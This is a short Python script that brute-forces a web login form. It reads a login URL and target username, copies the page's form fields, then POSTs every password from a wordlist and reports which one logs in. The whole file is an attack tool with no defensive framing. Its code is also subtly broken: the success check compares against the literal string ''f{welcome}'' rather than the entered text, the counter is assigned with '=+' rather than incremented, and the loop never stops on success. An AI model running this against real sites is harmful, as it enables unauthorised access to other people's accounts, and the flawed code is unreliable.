import requests
from bs4 import BeautifulSoup

#Credentials
url = input("{Input login URL} :")
username = input("{Target Username} :")
welcome = input ("{Resulting string} :")
formAttr= input ("{Form attribute} : ")
attrValue= input ("{Attribute value} : ")

#GET response from the server
response = requests.get(url)

#Parsing HTML response
soup = BeautifulSoup(response.text, 'html.parser')
inputs = []
form = soup.find('form', {formAttr: attrValue})

if form is not None:
    inputs = form.find_all('input')
else:
    print('No form found')

#A dictionary of the form data
data = {}
for input in inputs:
    if input.has_attr('name'):
        data[input['name']] = input.get('value', '')
#Assign credentials
data['username'] = username

#Password loop
with open('wordlist.txt', 'r') as passwords:
    x = 0
    for line in passwords:
        password = line.strip()
        data['password'] = password

        #POST request to the login page
        response = requests.post(url, data=data)

        # Login status
        try:
            x=+1
            assert 'f{welcome}' in response.text
            print(f'Login successful with password: {password}')      
        except AssertionError:
            print(f'Login failed with password: {password}')
            continue
